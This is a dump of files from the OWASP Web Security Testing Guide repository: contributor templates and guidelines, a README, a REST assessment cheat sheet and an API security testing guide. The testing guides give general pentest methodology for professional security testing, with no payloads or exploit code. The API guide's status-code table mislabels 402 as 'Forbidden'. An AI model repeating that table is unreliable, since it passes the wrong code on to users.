{"source": "github", "repo": "OWASP/wstg", "file": ".github/ISSUE_TEMPLATE/broken_link.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/ISSUE_TEMPLATE/broken_link.md", "content": "---\nname: Broken Link\nabout: Report broken links\ntitle: ''\nlabels: bug, help wanted, good first issue\nassignees: ''\n\n---\n\n**What and where?**\nPlease give the broken URL. Where is the link located?\n\nWould you like to be assigned to this issue?\nCheck the box if you will submit a PR to fix this issue. Please read CONTRIBUTING.md.\n- [ ] Assign me, please!\n", "timestamp": "2025-10-24T11:39:28.214181"}
{"source": "github", "repo": "OWASP/wstg", "file": ".github/ISSUE_TEMPLATE/feature_request.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/ISSUE_TEMPLATE/feature_request.md", "content": "---\nname: Feature Request\nabout: Suggest an idea for this project\ntitle: ''\nlabels: enhancement\nassignees: ''\n\n---\n\n**What would you like to happen?**\nAdd a clear and concise description of your idea to improve the project.\n", "timestamp": "2025-10-24T11:39:28.407722"}
{"source": "github", "repo": "OWASP/wstg", "file": ".github/ISSUE_TEMPLATE/fix-request.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/ISSUE_TEMPLATE/fix-request.md", "content": "---\nname: Fix Request\nabout: Create a report to help us improve\ntitle: ''\nlabels: revise, help wanted\nassignees: ''\n\n---\n\n**What's the issue?**\nDescribe the problem and why it should be fixed. Be concise and specific. Reference sections where appropriate.\n\n**How do we solve it?**\nClearly describe the solution you'd like to see implemented.\n\nWould you like to be assigned to this issue?\nCheck the box if you will submit a PR to fix this issue. Please read CONTRIBUTING.md.\n- [ ] Assign me, please!\n", "timestamp": "2025-10-24T11:39:28.499356"}
{"source": "github", "repo": "OWASP/wstg", "file": ".github/ISSUE_TEMPLATE/new-content.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/ISSUE_TEMPLATE/new-content.md", "content": "---\nname: Add New Content\nabout: Suggest additions to the Testing Guide\ntitle: ''\nlabels: new, help wanted\nassignees: ''\n\n---\n\n**What would you like added?**\nBriefly describe the topic of the new content. Is this a new section or an addition to an existing topic?\n\nWould you like to be assigned to this issue?\nCheck the box if you will submit a PR to add the proposed content. Please read CONTRIBUTING.md.\n- [ ] Assign me, please!\n", "timestamp": "2025-10-24T11:39:28.634275"}
{"source": "github", "repo": "OWASP/wstg", "file": ".github/pull_request_template.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/pull_request_template.md", "content": "This PR covers issue #<issue number>.\n\n- [ ] This PR handles the issue and requires no additional PRs.\n- [ ] You have validated the need for this change.\n\n**What did this PR accomplish?**\n\n- Point 1\n- Point 2\n\nThank you for your contribution!", "timestamp": "2025-10-24T11:39:30.827270"}
{"source": "github", "repo": "OWASP/wstg", "file": ".github/workflows/README.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/workflows/README.md", "content": "# Workflows Documentation\n\n## `build-checklists.yml`\n\nFor building checklists and Create a PR with changes made in the master.\n\n- Trigger: Push, Only when files inside document directory is changed. Manual (`workflow_dispatch`), GitHub web UI.\n- See: `/.github/xlsx/` in the root of the repository for XLSX build.\n\n## `build-ebooks.yml`\n\nFor building PDF and EPUB e-Books at release.\n\n- Trigger: Tag applied to repository. Manual (`workflow_dispatch`), GitHub web UI.\n- See: `/.github/pdf/` in the root of the repository for PDF build specific configurations.\n- See: `/.github/epub/` in the root of the repository for EPUB build specific configurations.\n\n## `comment.yml`\n\nTriggered by the completion of other workflows in order to comment lint or other results on PRs.\nThe workflows which leverage it should create a `pr_number` text file and `artifact.txt` with the content to be commented, which are attached to their workflow runs as `artifact`.\n\n- Trigger: Other workflows `workflow_run`.\n\n## `dummy.yml`\n\nUtility action so that PRs without Markdown files can pass the branch protection rules. `lint` is required per the branch protection rules. If a PR contains no Markdown files (e.g. only an image or YAML that isn't linted) the dummy runs and passes the branch protection requirement.\n\n- Trigger: Pull Requests.\n\n## `md-link-check.yml`\n\nChecks Pull Requests for broken links.\n\n- Trigger: Pull Requests.\n- Config File: `markdown-link-check-config.json`\n\n## `md-lint-check.yml`\n\nChecks Markdown files and flags style or syntax issues.\n\n- Trigger: Pull Requests.\n- Config File: `.markdownlint.json`\n\n## `md-textlint-check.yml`\n\nChecks Markdown files for spelling style and typo issues.\n\n- Trigger: Pull Requests.\n- Config File: `.textlintrc`\n\n## `www_latest_update.yml`\n\nPublishes the latest web content using the @wstgbot account to `OWASP/www-project-web-security-testing-guide`.\n\n- Trigger: Push.\n- See: `/.github/www/latest/` in the root of the repository.\n\n## `www_stable_update.yml`\n\nPublishes stable and versioned web content using the @wstgbot account to `OWASP/www-project-web-security-testing-guide`.\n\n- Trigger: Tag applied to repository (format `v*`).\n- See: `/.github/www/` in the root of the repository.", "timestamp": "2025-10-24T11:39:31.147483"}
{"source": "github", "repo": "OWASP/wstg", "file": ".github/www/README.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/www/README.md", "content": "# www\n\nThis directory contains github action dependencies for deployment of content to the owasp.org project website.\n\n- latest\n- stable\n- v41, etc.\n\n## assets\n\nThis folder is a storage location for the project's social/graphic assets.\n", "timestamp": "2025-10-24T11:39:31.495627"}
{"source": "github", "repo": "OWASP/wstg", "file": ".github/www/assets/README.md", "url": "https://github.com/OWASP/wstg/blob/master/.github/www/assets/README.md", "content": "# assets\n\nThis directory is a storage location for the project's social and graphics assets.\n\n- 202006-owasp_material &gt; contains assets prepared by [Ramzi Fazah](https://lb.linkedin.com/in/ramzi-fazah-48286766).\n  - These can be seen in use in various locations [wstgbot's GitHub profile](https://github.com/wstgbot), and the project's [Twitter presence](https://twitter.com/owasp_wstg).\n", "timestamp": "2025-10-24T11:39:32.510568"}
{"source": "github", "repo": "OWASP/wstg", "file": "CODE_OF_CONDUCT.md", "url": "https://github.com/OWASP/wstg/blob/master/CODE_OF_CONDUCT.md", "content": "# Contributor Covenant Code of Conduct\n\n## Our Pledge\n\nIn the interest of fostering an open and welcoming environment, we as\ncontributors and maintainers pledge to make participation in our project and\nour community a harassment-free experience for everyone, regardless of age, body\nsize, disability, ethnicity, sex characteristics, gender identity and expression,\nlevel of experience, education, socio-economic status, nationality, personal\nappearance, race, religion, or sexual identity and orientation.\n\n## Our Standards\n\nExamples of behavior that contributes to creating a positive environment\ninclude:\n\n- Using welcoming and inclusive language\n- Being respectful of differing viewpoints and experiences\n- Gracefully accepting constructive criticism\n- Focusing on what is best for the community\n- Showing empathy towards other community members\n\nExamples of unacceptable behavior by participants include:\n\n- The use of sexualized language or imagery and unwelcome sexual attention or\n  advances\n- Trolling, insulting/derogatory comments, and personal or political attacks\n- Public or private harassment\n- Publishing others' private information, such as a physical or electronic\n  address, without explicit permission\n- Other conduct which could reasonably be considered inappropriate in a\n  professional setting\n\n## Our Responsibilities\n\nProject maintainers are responsible for clarifying the standards of acceptable\nbehavior and are expected to take appropriate and fair corrective action in\nresponse to any instances of unacceptable behavior.\n\nProject maintainers have the right and responsibility to remove, edit, or\nreject comments, commits, code, wiki edits, issues, and other contributions\nthat are not aligned to this Code of Conduct, or to ban temporarily or\npermanently any contributor for other behaviors that they deem inappropriate,\nthreatening, offensive, or harmful.\n\n## Scope\n\nThis Code of Conduct applies within all project spaces, and it also applies when\nan individual is representing the project or its community in public spaces.\nExamples of representing a project or community include using an official\nproject email address, posting via an official social media account, or acting\nas an appointed representative at an online or offline event. Representation of\na project may be further defined and clarified by project maintainers.\n\n## Enforcement\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may be\nreported by contacting the organization at [owasp.foundation@owasp.org](mailto:owasp.foundation@owasp.org). All\ncomplaints will be reviewed and investigated and will result in a response that\nis deemed necessary and appropriate to the circumstances. The project team is\nobligated to maintain confidentiality with regard to the reporter of an incident.\nFurther details of specific enforcement policies may be posted separately.\n\nProject maintainers who do not follow or enforce the Code of Conduct in good\nfaith may face temporary or permanent repercussions as determined by other\nmembers of the project's leadership.\n\n## Attribution\n\nThis Code of Conduct is adapted from the [Contributor Covenant][homepage], [version 1.4](https://www.contributor-covenant.org/version/1/4/code-of-conduct.html)\n\n[homepage]: https://www.contributor-covenant.org\n\nFor answers to common questions about this code of conduct, see\n<https://www.contributor-covenant.org/faq>\n", "timestamp": "2025-10-24T11:39:36.341925"}
{"source": "github", "repo": "OWASP/wstg", "file": "CONTRIBUTING.md", "url": "https://github.com/OWASP/wstg/blob/master/CONTRIBUTING.md", "content": "# Contributing to the Testing Guide\n\nThank you for considering contributing to the Web Security Testing Guide (WSTG)!\n\nHere are some ways you can make a helpful contribution. The [Open Source Guide for why and how to contribute](https://opensource.guide/how-to-contribute/) is also a good resource. You will need a [GitHub account](https://help.github.com/en/github/getting-started-with-github/signing-up-for-a-new-github-account) in order to help out.\n\n- [Become an Author](#become-an-author)\n- [Become a Reviewer or Editor](#become-a-reviewer-or-editor)\n    - [Technical Review](#technical-review)\n    - [Editorial Review](#editorial-review)\n- [How to Open an Issue](#how-to-open-an-issue)\n- [How to Submit a Pull Request](#how-to-submit-a-pull-request)\n- [How to Set Up Your Contributor Environment](#how-to-set-up-your-contributor-environment)\n- [Contributing with Codespaces](#contributing-with-codespaces)\n\n## Become an Author\n\nThis project would not be possible without the contributions of writers in the security community! Our authors help to keep the WSTG relevant and useful for everyone.\n\nWhether you are submitting a new section or adding information to an existing one, please follow the [template example](template/999-Foo_Testing/1-Testing_for_a_Cat_in_a_Box.md). The [template sections are explained here](template/999-Foo_Testing/2-Template_Explanation.md).\n\nWhen submitting your [pull request](#how-to-submit-a-pull-request), authors should link contributions to an issue:\n\n1. Open an [Add New Content issue](https://github.com/OWASP/wstg/issues/new?assignees=&labels=New&template=new-content.md&title=), or choose an [unassigned new content issue](https://github.com/OWASP/wstg/issues?q=is%3Aopen+is%3Aissue+label%3ANew+no%3Aassignee) and ask to be assigned to it.\n2. Create and switch to a new local branch with the name `new-<issue number>`. For example, `git checkout -b new-164`.\n\n## Become a Reviewer or Editor\n\nKeeping the project up to date and looking spiffy is a group effort! The WSTG is a constantly updated document and benefits from your technical or editorial review.\n\nWhen submitting your [pull request](#how-to-submit-a-pull-request), reviewers and editors should link contributions to an issue:\n\n1. Choose an [open issue with the `help wanted` label](https://github.com/OWASP/wstg/labels/help%20wanted) to work on, or [open an issue](https://github.com/OWASP/wstg/issues/new/choose) yourself. Post a comment in the issue and request to be assigned to it.\n2. Create and switch to a new local branch with the name `fix-<issue number>`. For example, `git checkout -b fix-88`.\n\n### Technical Review\n\nIf you have expertise in any topic covered by the WSTG, your technical review is encouraged. Please ensure that articles:\n\n- Follow the [article template materials](template)\n- Follow the [style guide](style_guide.md)\n- Accurately describe vulnerabilities and tests\n- Have appropriate and up-to-date inline links to resources\n- Provide complete and relevant information suitable for an audience with basic technical expertise\n\n### Editorial Review\n\nGrammarians assemble! The WSTG welcomes your improvements in the areas of grammar, formatting, word choice, and brevity. All changes should adhere to the [style guide](style_guide.md).\n\nPlease don't hesitate to make as many changes as you see fit, especially if you notice that existing content does not match the [article template materials](template).\n\n### Translation\n\nDue to challenges with syncing images and removed content, the WSTG is no longer tackling in-bound translation efforts directly.\n\nAt this time we suggest that you start another repository in which to tackle translations of a specific language. Once you've produced a PDF for a given version of the guide we'll be happy to attach it to the appropriate release. Simply [open an issue](https://github.com/OWASP/wstg/issues/new) here asking us to do so.\n\nAlso we're willing to list your translation repository, just [let us know](https://github.com/OWASP/wstg/issues/new) where it is.\n\n## How to Open an Issue\n\n[Create an issue](https://github.com/OWASP/wstg/issues/new/choose) using the appropriate template.\n\nChoose a short, descriptive title. Briefly explain what you think needs changing. Among other things, your suggestions may include grammar or spelling errors, or address insufficient or outdated content.\n\n## How to Submit a Pull Request\n\nHere are the steps for creating and submitting a Pull Request (PR) that we can quickly review and merge.\n\n1. [Set up your environment](#how-to-set-up-your-contributor-environment) to fork the project and install a Markdown linter.\n2. Associate your contribution with an [issue](https://github.com/OWASP/wstg/issues). To change existing content, read [Become a Reviewer or Editor](#become-a-reviewer-or-editor). To make additions, read [Become an Author](#become-an-author).\n3. Make your modifications. Be sure to follow our [style guide](style_guide.md).\n4. When you're ready to submit your work, push your changes to your fork. Ensure that your fork is [synced with `master`](https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/syncing-a-fork).\n5. You can submit a [draft PR](https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/about-pull-requests#draft-pull-requests) or a [regular PR](https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/creating-a-pull-request-from-a-fork). If your work is not yet ready for review and merge, choose a draft PR. When your changes are ready to be reviewed, you can convert to a regular PR. See [how to change the stage of a PR](https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/changing-the-stage-of-a-pull-request) for more.\n\nYou may want to [allow edits from maintainers](https://help.github.com/en/github/collaborating-with-issues-and-pull-requests/allowing-changes-to-a-pull-request-branch-created-from-a-fork) so we can help with small changes like fixing typos.\n\nOnce you've submitted your ready-for-review PR, we'll review it. We may comment to ask for clarification or changes, so please check back in the next few days.\n\nTo increase the chances that your PR is merged, please make sure that:\n\n1. You've followed the guidelines above for associating your work with an issue.\n2. Your work is Markdown linted.\n3. Your writing follows the [article template materials](template) and [style guide](style_guide.md).\n4. Your code snippets are correct, well-tested, and commented where necessary for understanding.\n\nOnce the PR is complete, we'll merge it! At that point, you may like to add yourself to [the project's list of authors, reviewers, or editors](document/1-Frontispiece/README.md).\n\n## How to Set Up Your Contributor Environment\n\n1. [Create an account on GitHub](https://help.github.com/en/github/getting-started-with-github/signing-up-for-a-new-github-account).\n2. Install [Visual Studio Code](https://code.visualstudio.com/) and this [Markdown linter plugin](https://github.com/DavidAnson/vscode-markdownlint#install). We use this linter to help keep the project content consistent and pretty.\n\n    1. From the gear icon/menu select \"Settings\".\n    2. Select the \"Workspace\" tab.\n    3. Expand \"Extensions\", and find \"markdownlint\".\n    4. Just below \"Markdownlint: config\" click the \"Edit in settings.json\" link.\n    5. Add the following:\n\n    ```json\n    \"markdownlint.config\": {\n      \"extends\": \".github/configs/.markdownlint.json\"\n    }\n    ```\n\n3. Fork and clone your own copy of the repository. Here are complete instructions for [forking and syncing with GitHub](https://help.github.com/en/github/getting-started-with-github/fork-a-repo).\n\n## Contributing with Codespaces\n\nWe've included settings for GitHub Codespaces so you can use a cloud-hosted IDE to contribute to this repository! Our configuration includes Visual Studio Code extensions and `markdownlint` configuration settings that help to keep work consistent across all our amazing contributors.\n\nCodespaces is currently in limited beta. To learn more, see [About Codespaces](https://docs.github.com/en/github/developing-online-with-codespaces/about-codespaces).\n\nIf you have access to the beta, get started by [creating a codespace](https://docs.github.com/en/github/developing-online-with-codespaces/creating-a-codespace) for this repository.\n", "timestamp": "2025-10-24T11:39:36.639183"}
{"source": "github", "repo": "OWASP/wstg", "file": "README.md", "url": "https://github.com/OWASP/wstg/blob/master/README.md", "content": "# OWASP Web Security Testing Guide\n\n[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](https://github.com/OWASP/wstg/issues)\n[![OWASP Flagship](https://img.shields.io/badge/owasp-flagship-brightgreen.svg)](https://owasp.org/projects/)\n[![Twitter Follow](https://img.shields.io/twitter/follow/owasp_wstg?style=social)](https://twitter.com/owasp_wstg)\n\n[![Creative Commons License](https://licensebuttons.net/l/by-sa/4.0/88x31.png)](https://creativecommons.org/licenses/by-sa/4.0/ \"CC BY-SA 4.0\")\n\nWelcome to the official repository for the Open Worldwide Application Security Project® (OWASP®) Web Security Testing Guide (WSTG). The WSTG is a comprehensive guide to testing the security of web applications and web services. Created by the collaborative efforts of security professionals and dedicated volunteers, the WSTG provides a framework of best practices used by penetration testers and organizations all over the world.\n\nWe are currently working on release version 5.0. You can [read the current document here on GitHub](https://github.com/OWASP/wstg/tree/master/document).\n\nFor the last stable release, [check release 4.2](https://github.com/OWASP/wstg/releases/tag/v4.2). Also available [online](https://owasp.org/www-project-web-security-testing-guide/v42/).\n\n- [How To Reference WSTG Scenarios](#how-to-reference-wstg-scenarios)\n    - [Linking](#linking)\n- [Contributions, Feature Requests, and Feedback](#contributions-feature-requests-and-feedback)\n- [Chat With Us](#chat-with-us)\n- [Project Leaders](#project-leaders)\n- [Core Team](#core-team)\n- [Translations](#translations)\n\n## How To Reference WSTG Scenarios\n\nEach scenario has an identifier in the format `WSTG-<category>-<number>`, where: 'category' is a 4 character upper case string that identifies the type of test or weakness, and 'number' is a zero-padded numeric value from 01 to 99. For example:`WSTG-INFO-02` is the second Information Gathering test.\n\nThe identifiers may change between versions. Therefore, it is preferable that other documents, reports, or tools use the format: `WSTG-<version>-<category>-<number>`, where: 'version' is the version tag with punctuation removed. For example: `WSTG-v42-INFO-02` would be understood to mean specifically the second Information Gathering test from version 4.2.\n\nIf identifiers are used without including the `<version>` element, they should be assumed to refer to the latest Web Security Testing Guide content. As the guide grows and changes this becomes problematic, which is why writers or developers should include the version element.\n\n### Linking\n\nLinking to Web Security Testing Guide scenarios should be done using versioned links not `stable` or `latest`, which will change with time. However, it is the project team's intention that versioned links do not change. For example: `https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.html`. Note: the `v42` element refers to version 4.2.\n\n## Contributions, Feature Requests, and Feedback\n\nWe are actively inviting new contributors! To start, read the [contribution guide](CONTRIBUTING.md).\n\nFirst time here? Here are [GitHub's suggestions for first-time contributors](https://github.com/OWASP/wstg/contribute) to this repository.\n\nThis project is only possible thanks to the work of many dedicated volunteers. Everyone is encouraged to help in ways large and small. Here are a few ways you can help:\n\n- Read the current content and help us fix any spelling mistakes or grammatical errors.\n- Help with [translation](CONTRIBUTING.md#translation) efforts.\n- Choose an existing issue and submit a pull request to fix it.\n- Open a new issue to report an opportunity for improvement.\n\nTo learn how to contribute successfully, read the [contribution guide](CONTRIBUTING.md).\n\nSuccessful contributors appear on [the project's list of authors, reviewers, or editors](document/1-Frontispiece/README.md).\n\n## Chat With Us\n\nWe're easy to find on Slack:\n\n1. Join the OWASP Group Slack with this [invitation link](https://owasp.org/slack/invite).\n2. Join this project's [channel, #testing-guide](https://app.slack.com/client/T04T40NHX/CJ2QDHLRJ).\n\nFeel free to ask questions, suggest ideas, or share your best recipes.\n\nYou can @ us on Twitter [@owasp_wstg](https://twitter.com/owasp_wstg).\n\nYou can also join our [Google Group](https://groups.google.com/a/owasp.org/forum/#!forum/testing-guide-project).\n\n## Project Leaders\n\n- [Rick Mitchell](https://github.com/kingthorin)\n- [Elie Saad](https://github.com/ThunderSon)\n\n## Core Team\n\n- [Rejah Rehim](https://github.com/rejahrehim)\n- [Victoria Drake](https://github.com/victoriadrake)\n\n## Translations\n\n- [Portuguese-BR](https://github.com/doverh/wstg-translations-pt)\n- [Russian](https://github.com/andrettv/WSTG/tree/master/WSTG-ru)\n- [Persian (Farsi)](https://github.com/whoismh11/owasp-wstg-fa)\n- [Turkish](https://github.com/enoskom/Owasp-wstg)\n\n---\n\nOpen Worldwide Application Security Project and OWASP are registered trademarks of the OWASP Foundation, Inc.\n", "timestamp": "2025-10-24T11:39:37.094211"}
{"source": "github", "repo": "OWASP/wstg", "file": "REST_CS_Migrate.md", "url": "https://github.com/OWASP/wstg/blob/master/REST_CS_Migrate.md", "content": "# REST Assessment Cheat Sheet\n\n## About RESTful Web Services\n\nWeb Services are an implementation of web technology used for machine to machine communication. As such they are used for Inter application communication, Web 2.0 and Mashups and by desktop and mobile applications to call a server.\n\nRESTful web services (often called simply REST) are a light weight variant of Web Services based on the RESTful design pattern. In practice RESTful web services utilizes HTTP requests that are similar to regular HTTP calls in contrast with other Web Services technologies such as SOAP which utilizes a complex protocol.\n\n## Key relevant properties of RESTful web services\n\n- Use of HTTP methods (`GET`, `POST`, `PUT` and `DELETE`) as the primary verb for the requested operation.\n- Non-standard parameters specifications:\n    - As part of the URL.\n    - In headers.\n- Structured parameters and responses using JSON or XML in a parameter values, request body or response body. Those are required to communicate machine useful information.\n- Custom authentication and session management, often utilizing custom security tokens: this is needed as machine to machine communication does not allow for login sequences.\n- Lack of formal documentation. A [proposed standard for describing RESTful web services called WADL](https://www.w3.org/Submission/wadl/) was submitted by Sun Microsystems but was never officially adapted.\n\n## The challenge of security testing RESTful web services\n\n- Inspecting the application does not reveal the attack surface, I.e. the URLs and parameter structure used by the RESTful web service. The reasons are:\n    - No application utilizes all the available functions and parameters exposed by the service\n    - Those used are often activated dynamically by client-side code and not as links in pages.\n    - The client application is often not a web application and does not allow inspection of the activating link or even relevant code.\n- The parameters are none standard making it hard to determine what is just part of the URL or a constant header and what is a parameter worth [fuzzing](https://owasp.org/www-community/Fuzzing).\n- As a machine interface the number of parameters used can be very large, for example a JSON structure may include dozens of parameters. [fuzzing](https://owasp.org/www-community/Fuzzing) each one significantly lengthen the time required for testing.\n- Custom authentication mechanisms require reverse engineering and make popular tools not useful as they cannot track a login session.\n\n## How to pentest a RESTful web service\n\nDetermine the attack surface through documentation - RESTful pen testing might be better off if some level of white box testing is allowed and you can get information about the service.\n\nThis information will ensure fuller coverage of the attack surface. Such information to look for:\n\n- Formal service description - While for other types of web services such as SOAP a formal description, usually in WSDL is often available, this is seldom the case for REST. That said, either WSDL 2.0 or WADL can describe REST and are sometimes used.\n- A developer guide for using the service may be less detailed but will commonly be found, and might even be considered *black box*.\n- Application source or configuration - in many frameworks, including dotNet ,the REST service definition might be easily obtained from configuration files rather than from code.\n\nCollect full requests using a [proxy](https://www.zaproxy.org/) - while always an important pen testing step, this is more important for REST based applications as the application UI may not give clues on the actual attack surface.\n\nNote that the proxy must be able to collect full requests and not just URLs as REST services utilize more than just GET parameters.\n\nAnalyze collected requests to determine the attack surface:\n\n- Look for non-standard parameters:\n    - Look for abnormal HTTP headers - those would many times be header based parameters.\n    - Determine if a URL segment has a repeating pattern across URLs. Such patterns can include a date, a number or an ID like string and indicate that the URL segment is a URL embedded parameter.\n        - For example: `https://server/srv/2013-10-21/use.php`\n    - Look for structured parameter values - those may be JSON, XML or a non-standard structure.\n    - If the last element of a URL does not have an extension, it may be a parameter. This is especially true if the application technology normally uses extensions or if a previous segment does have an extension.\n        - For example: `https://server/svc/Grid.asmx/GetRelatedListItems`\n    - Look for highly varying URL segments - a single URL segment that has many values may be parameter and not a physical directory.\n        - For example if the URL `https://server/src/XXXX/page` repeats with hundreds of value for `XXXX`, chances `XXXX` is a parameter.\n\nVerify non-standard parameters: in some cases (but not all), setting the value of a URL segment suspected of being a parameter to a value expected to be invalid can help determine if it is a path elements of a parameter. If a path element, the web server will return a *404* message, while for an invalid value to a parameter the answer would be an application level message as the value is legal at the web server level.\n\nAnalyzing collected requests to optimize [fuzzing](https://owasp.org/www-community/Fuzzing) - after identifying potential parameters to fuzz, analyze the collected values for each to determine:\n\n- Valid vs. invalid values, so that [fuzzing](https://owasp.org/www-community/Fuzzing) can focus on marginal invalid values.\n    - For example sending *0* for a value found to be always a positive integer.\n- Sequences allowing to fuzz beyond the range presumably allocated to the current user.\n\nLastly, when [fuzzing](https://owasp.org/www-community/Fuzzing), don't forget to emulate the authentication mechanism used.\n\n## Related Resources\n\n- [REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) - the other side of this cheat sheet\n- [RESTful services, web security blind spot](https://www.youtube.com/watch?v=pWq4qGLAZHI) - avideo presentation elaborating on most of the topics on this cheat sheet.\n", "timestamp": "2025-10-24T11:39:37.362352"}
{"source": "github", "repo": "OWASP/wstg", "file": "Testing_for_APIs.md", "url": "https://github.com/OWASP/wstg/blob/master/Testing_for_APIs.md", "content": "# API Testing\n\nWeb APIs have gained a lot of popularity as they allow third-party programs to interact with sites in a more efficient and easy way. In this guide, we will discuss some basic concepts about APIs and the way to test security for APIs.\n\n## Background Concepts\n\nREST (Representational State Transfer) is an architecture that is implemented while developer design APIs.\nWeb application APIs following the REST style are called REST API.\nREST APIs use URIs (Uniform Resource Identifiers) to access resources. The generic URI syntax as defined in [RFC3986](https://tools.ietf.org/html/rfc3986) as below:\n\n> URI = scheme \"://\" authority \"/\" path [ \"?\" query ] [ \"#\" fragment ]\n\nWe are interested in the path of URI as the relationship between user and resources.\nFor example, `https://api.test.xyz/admin/testing/report`, this shows report of testing, there is relationship between user admin and their reports.\n\nThe path of any URI will define REST API resource model, resources are separated by a forward slash and based on Top-Down design.\nFor example:\n\n- `https://api.test.xyz/admin/testing/report`\n- `https://api.test.xyz/admin/testing/`\n- `https://api.test.xyz/admin/`\n\nREST API requests follow the [HTTP Request Methods](https://tools.ietf.org/html/rfc7231#section-4) defined in [RFC7231](https://tools.ietf.org/html/rfc7231)\n\n| Methods | Description                                   |\n|---------|-----------------------------------------------|\n| GET     | Get the representation of resource’s state    |\n| POST    | Create a new resource                         |\n| PUT     | Update a resource                             |\n| DELETE  | Remove a resource                             |\n| HEAD    | Get metadata associated with resource’s state |\n| OPTIONS | List available methods                        |\n\nREST APIs use the response status code of HTTP response message to notify the client about their request’s result.\n\n| Response Code | Response Message      | Description                                                                                            |\n|---------------|-----------------------|--------------------------------------------------------------------------------------------------------|\n| 200           | OK                    | Success while processing client's request                                                              |\n| 201           | Created               | New resource created                                                                                   |\n| 301           | Moved Permanently     | Permanent redirection                                                                                  |\n| 304           | Not Modified          | Caching related response that returned when the client has the same copy of the resource as the server |\n| 307           | Temporary Redirect    | Temporary redirection of resource                                                                      |\n| 400           | Bad Request           | Malformed request by the client                                                                        |\n| 401           | Unauthorized          | Client is not allowed to make requests or access a particular resource                                 |\n| 402           | Forbidden             | Client is forbidden to access the resource                                                             |\n| 404           | Not Found             | Resource doesn't exist or incorrect based on the request                                               |\n| 405           | Method Not Allowed    | Invalid method or unknown method used                                                                  |\n| 500           | Internal Server Error | Server failed to process request due to an internal error                                              |\n\nHTTP headers are used in requests and responses.\nWhile making API requests, Content-Type header is used and is set to `application/json` because the message body contains JSON data format.\n\nWeb authentication types are based on:\n\n- Bearer Tokens: Identified by the `Authorization: Bearer <token>` header. Once a user logs in, they are provided with a bearer token that is sent on every request in order to authenticate and authorize the user to access OAuth 2.0 protected resources.\n- HTTP Cookies: Identified by the `Cookie: <name>=<unique value>` header. On user login success, the server replies with a `Set-Cookie` header specifying its name and unique value. On every request, the browser automatically appends it to the requests going to that server, following [SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).\n- Basic HTTP authentication: Identified by the `Authorization: Basic <base64 value>` header. Once a user is trying to login, the request is sent with the mentioned header containing the a base64 value, having its content as `username:password`. This is one of the weakest forms of authentication as it transmits the username and password on every request in an encoded manner, which can be easily retrieved.\n\n## How to Test\n\n### Generic Testing Method\n\nStep 1: List endpoint and make different request method: Login with user profile and use a spider tool to list the endpoints of this role.\nTo examine the endpoints, you will need to make different request methods and observe how the API behaves.\n\nStep 2: Exploit bugs - As know how to list endpoints and examine endpoints with HTTP methods at step 1, we will find some way to exploit bug. Some testing strategies are below:\n\n- IDOR testing\n- Privilege escalation\n\n### Specific Testing – (Token-Based) Authentication\n\nToken-based authentication is implemented by sending a signed token (verified by the server) with each HTTP request.\n\nThe most commonly used token format is the JSON Web Token (JWT), defined in [RFC7519](https://tools.ietf.org/html/rfc7519). The [Testing JSON Web Tokens](/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md) guide contains further details on how to test JWTs.\n\n## Related Test Cases\n\n- [IDOR](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md)\n- [Privilege escalation](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md)\n- All [Session Management](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing) test cases\n- [Testing JSON Web Tokens](/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)\n\n## Tools\n\n- ZAP\n- Burp suite\n\n## References\n\n- [REST HTTP Methods](https://restfulapi.net/http-methods/)\n- [RFC3986 URI](https://tools.ietf.org/html/rfc3986)\n- [JWT](https://jwt.io/)\n- [Cracking JWT](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)\n", "timestamp": "2025-10-24T11:39:37.655600"}
{"source": "github", "repo": "OWASP/wstg", "file": "checklists/README.md", "url": "https://github.com/OWASP/wstg/blob/master/checklists/README.md", "content": "# Web Security Testing Guide Checklist\n\nContained in this folder is an Excel file which provides the following worksheets:\n\n- _Testing Checklist_ - facilitates simple progress tracking against each of the \"tests\" outlined in the guide.\n- _Summary Findings_ - facilitates creating a table of test outcomes and potential recommendations.\n- _Risk Assessment Calculator_ - a dropdown driven sheet for calculating likelihood and impact scores, and a qualitative overall risk rating.\n- _References_ - provides the lists/sets that the calculator is based upon.\n\n**Note:** The current (Excel) checklist is based on v4.2 of the OWASP Testing Guide, as content for v5 is still under development.\n\n## Direct Link\n\n- [OWASP Testing Checklist (Excel)](https://raw.githubusercontent.com/OWASP/wstg/master/checklists/checklist.xlsx)\n- [OWASP Testing Checklist (Markdown)](https://raw.githubusercontent.com/OWASP/wstg/master/checklists/checklist.md)\n\n## Excel File Hash\n\nSHA-256: 96e7842efd9ac2937ac65ce86613a791f0f428dcd6f1e04e2afc632a719248c3\n\n## Google Sheets Template\n\nThe following instructions can be used to copy the Checklist spreadsheet template directly into a new Google sheet without having to save the doc locally first.\n\n1. Go to this [Google Spreadsheet template](https://docs.google.com/spreadsheets/d/1csiYqA3DXhpz69K2JCLKN4H-kzkRFlFi/copy?copyCollaborators=false&copyComments=false&title=WSTG+Checklist)\n2. Click `Make a copy` button. This will create a new checklist in your logged in Google Drive.\n3. You should now have a fully populated and functional Web Security Testing Guide Checklist in a Google sheet, 